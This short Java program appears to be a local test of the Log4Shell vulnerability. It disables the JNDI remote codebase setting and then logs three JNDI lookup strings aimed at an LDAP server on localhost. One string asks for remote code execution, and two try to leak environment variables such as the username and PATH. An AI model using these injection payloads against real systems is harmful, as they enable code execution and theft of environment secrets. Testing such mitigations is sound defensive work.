package log4shell;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class FailingApp {
  private static final Logger log = LogManager.getLogger(FailingApp.class);

  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
    log.error("${jndi:ldap://127.0.0.1:1389/run=Log4jRCE}");
    log.error("${jndi:ldap://127.0.0.1:1389/log=PATH:${env:USERNAME}}");
    log.error("${jndi:ldap://127.0.0.1:1389/log=PATH:${env:PATH}}");
  }
}
